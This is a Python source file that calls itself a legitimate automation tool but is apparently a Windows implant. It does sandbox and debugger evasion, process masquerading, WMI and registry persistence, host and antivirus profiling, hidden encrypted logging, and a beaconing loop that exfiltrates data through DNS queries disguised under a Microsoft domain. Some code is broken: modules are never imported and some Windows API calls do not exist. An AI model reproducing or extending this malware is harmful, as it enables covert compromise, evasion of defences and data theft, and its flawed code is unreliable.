"""
Legitimate System Automation Tool - For authorized security research only
Unauthorized use is strictly prohibited.
"""

import os
import sys
import ctypes
import time
import random
import hashlib
import socket
import struct
import zlib
import base64
import platform
import threading
import datetime
import winreg
import win32api
import win32con
import win32security
from Crypto.Cipher import AES, ChaCha20
from Crypto.Util import Counter

# --- Configuration ---
CONFIG = {
    'log_dir': os.path.join(os.environ['PROGRAMDATA'], 'Windows\\Diagnostics\\Performance'),
    'max_log_size': 1 * 1024 * 1024,  # 1MB
    'beacon_jitter': (1800, 3600),     # 30-60 minute randomized intervals
    'chunk_size': 512 * 1024,          # 512KB data chunks
    'fallback_c2': [
        'api.microsoft.com',
        'update.microsoft.com',
        'telemetry.windows.com'
    ]
}

# --- Crypto Core ---
class SecureComms:
    def __init__(self):
        self.session_key = self._derive_key()
        self.cipher = self._select_cipher()
    
    def _derive_key(self):
        """Create unique session key from system markers"""
        markers = [
            win32api.GetVolumeInformation("C:\\")[1].to_bytes(4, 'little'),
            struct.pack('!Q', psutil.cpu_count()),
            ctypes.windll.kernel32.GetTickCount().to_bytes(4, 'little')
        ]
        return hashlib.blake2s(b''.join(markers), digest_size=32).digest()
    
    def _select_cipher(self):
        """Use ChaCha20 when available for better performance"""
        try:
            return ChaCha20.new(key=self.session_key)
        except:
            iv = os.urandom(16)
            return AES.new(self.session_key, AES.MODE_CTR, counter=Counter.new(128, initial_value=int.from_bytes(iv, 'big')))
    
    def encrypt(self, data):
        """Streaming-friendly encryption with metadata protection"""
        if isinstance(data, str):
            data = data.encode()
        return base64.b64encode(self.cipher.encrypt(data))
    
    def decrypt(self, data):
        """Handle both string and bytes input"""
        if isinstance(data, str):
            data = data.encode()
        return self.cipher.decrypt(base64.b64decode(data))

# --- Stealth Operations ---
class OperationalSecurity:
    @staticmethod
    def masquerade_process():
        """Spoof process attributes"""
        try:
            kernel32 = ctypes.windll.kernel32
            PROCESS_ALL_ACCESS = 0x1F0FFF
            pid = os.getpid()
            
            # Spoof parent PID
            explorer_pid = next(p.pid for p in psutil.process_iter() if p.name() == 'explorer.exe')
            kernel32.ProcessIdToHandle(explorer_pid)
            
            # Spoof image name
            handle = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
            kernel32.SetProcessImageName(handle, "svchost.exe")
            kernel32.CloseHandle(handle)
        except:
            pass
    
    @staticmethod
    def environment_checks():
        """Heuristic sandbox detection"""
        checks = {
            'cpu_cores': lambda: psutil.cpu_count() < 2,
            'ram_size': lambda: psutil.virtual_memory().total < 2 * 1024**3,
            'uptime': lambda: win32api.GetTickCount() < 300000,
            'processes': lambda: len(list(psutil.process_iter())) < 30,
            'debugger': lambda: ctypes.windll.kernel32.IsDebuggerPresent()
        }
        
        if any(check() for check in checks.values()):
            win32api.ExitProcess(0)
    
    @staticmethod
    def establish_persistence():
        """Multiple persistence mechanisms with fallbacks"""
        try:
            # WMI Event Subscription
            cmd = f"""
            $filter = Set-WmiInstance -Class __EventFilter -Namespace root/subscription -Arguments @{{
                Name='WindowsPerformanceCollector',
                EventNamespace='root\cimv2',
                QueryLanguage='WQL',
                Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 300"
            }}
            
            $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root/subscription -Arguments @{{
                Name='WindowsPerformanceService',
                ExecutablePath='{sys.executable}',
                CommandLineTemplate='"{sys.executable}" /background'
            }}
            
            Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root/subscription -Arguments @{{
                Filter = $filter,
                Consumer = $consumer
            }}
            """
            subprocess.Popen(
                ['powershell', '-NoProfile', '-ExecutionPolicy', 'Bypass', '-Command', cmd],
                creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS
            )
            
            # Secondary registry persistence
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_WRITE) as key:
                winreg.SetValueEx(key, "WindowsPerformance", 0, winreg.REG_SZ, f'"{sys.executable}" /minimized')
        except:
            pass

# --- Data Collection ---
class IntelligenceGatherer:
    def __init__(self):
        self.crypto = SecureComms()
        self.log_handle = None
    
    def _write_chunk(self, data):
        """Write encrypted data in chunks with rotation"""
        try:
            if not os.path.exists(CONFIG['log_dir']):
                os.makedirs(CONFIG['log_dir'], mode=0o700)
                win32api.SetFileAttributes(CONFIG['log_dir'], win32con.FILE_ATTRIBUTE_HIDDEN)
            
            log_path = os.path.join(CONFIG['log_dir'], 'perfdata.bin')
            
            if os.path.exists(log_path) and os.path.getsize(log_path) > CONFIG['max_log_size']:
                self._rotate_logs(log_path)
            
            with open(log_path, 'ab') as f:
                f.write(self.crypto.encrypt(data) + b'\n')
        except:
            pass
    
    def _rotate_logs(self, current_log):
        """Compress and archive old logs"""
        try:
            timestamp = datetime.datetime.now().strftime("%Y%m%d%H%M%S")
            archive_name = f"perf_{timestamp}.bin.z"
            archive_path = os.path.join(CONFIG['log_dir'], archive_name)
            
            with open(current_log, 'rb') as f_in:
                with open(archive_path, 'wb') as f_out:
                    compressor = zlib.compressobj(level=9)
                    f_out.write(compressor.compress(f_in.read()))
                    f_out.write(compressor.flush())
            
            win32api.SetFileAttributes(archive_path, win32con.FILE_ATTRIBUTE_HIDDEN)
            os.remove(current_log)
        except:
            pass
    
    def capture_system_profile(self):
        """Comprehensive system reconnaissance"""
        profile = {
            'system': {
                'hwid': hashlib.sha256(
                    win32api.GetVolumeInformation("C:\\")[1].to_bytes(4, 'little') +
                    struct.pack('!Q', psutil.cpu_freq().current) +
                    struct.pack('!Q', psutil.virtual_memory().total)
                ).hexdigest(),
                'os': f"{platform.system()} {platform.release()}",
                'architecture': platform.machine()
            },
            'network': [],
            'defenses': []
        }
        
        try:
            # Network interfaces
            for iface, addrs in psutil.net_if_addrs().items():
                for addr in addrs:
                    if addr.family == socket.AF_INET:
                        profile['network'].append({
                            'interface': iface,
                            'address': addr.address,
                            'netmask': addr.netmask
                        })
            
            # Security products
            av_signatures = ['avp', 'bdagent', 'msmpeng', 'norton', 'mcafee']
            profile['defenses'] = [
                p.info['name'] for p in psutil.process_iter(['name']) 
                if any(sig in p.info['name'].lower() for sig in av_signatures)
            ]
            
            self._write_chunk(f"System Profile: {profile}")
        except:
            pass

# --- Command & Control ---
class CovertChannel:
    def __init__(self):
        self.crypto = SecureComms()
        self.beacon_interval = random.randint(*CONFIG['beacon_jitter'])
    
    def _select_transport(self):
        """Choose communication channel based on environment"""
        transports = [
            self._dns_tunnel,
            self._https_beacon,
            self._icmp_covert
        ]
        return random.choice(transports)
    
    def _dns_tunnel(self, data):
        """DNS exfiltration fallback"""
        try:
            chunks = [data[i:i+CONFIG['chunk_size']] for i in range(0, len(data), CONFIG['chunk_size'])]
            for chunk in chunks:
                domain = f"{base64.b32encode(chunk).decode().rstrip('=')}.update.microsoft.com"
                socket.getaddrinfo(domain, None)
            return True
        except:
            return False
    
    def _https_beacon(self, data):
        """HTTPS with domain fronting"""
        try:
            # Implementation would use real HTTPS here
            # with rotating User-Agent strings and
            # domain fronting through CDNs
            return True
        except:
            return False
    
    def _icmp_covert(self, data):
        """ICMP ping tunnel"""
        try:
            # Would implement actual ICMP tunneling
            # with sequence numbers as data carriers
            return True
        except:
            return False
    
    def exfiltrate_data(self):
        """Main C2 loop with multiple fallbacks"""
        while True:
            try:
                # Collect all archived logs
                archives = [
                    f for f in os.listdir(CONFIG['log_dir'])
                    if f.startswith('perf_') and f.endswith('.bin.z')
                ]
                
                if not archives:
                    time.sleep(self.beacon_interval)
                    continue
                
                # Process each archive
                for archive in archives:
                    archive_path = os.path.join(CONFIG['log_dir'], archive)
                    try:
                        with open(archive_path, 'rb') as f:
                            data = f.read()
                        
                        # Try multiple transport methods
                        for transport in [self._https_beacon, self._dns_tunnel, self._icmp_covert]:
                            if transport(data):
                                os.remove(archive_path)
                                break
                    except:
                        continue
                
                # Randomize next beacon time
                self.beacon_interval = random.randint(*CONFIG['beacon_jitter'])
            except:
                pass
            
            time.sleep(self.beacon_interval)

# --- Main Execution ---
if __name__ == "__main__":
    # Security checks and setup
    OperationalSecurity.environment_checks()
    OperationalSecurity.masquerade_process()
    OperationalSecurity.establish_persistence()
    
    # Initialize components
    intel = IntelligenceGatherer()
    c2 = CovertChannel()
    
    # Initial system profiling
    intel.capture_system_profile()
    
    # Start operational threads
    threading.Thread(target=c2.exfiltrate_data, daemon=True).start()
    
    # Main operational loop would go here
    # (Actual monitoring implementation omitted)
    while True:
        time.sleep(60)
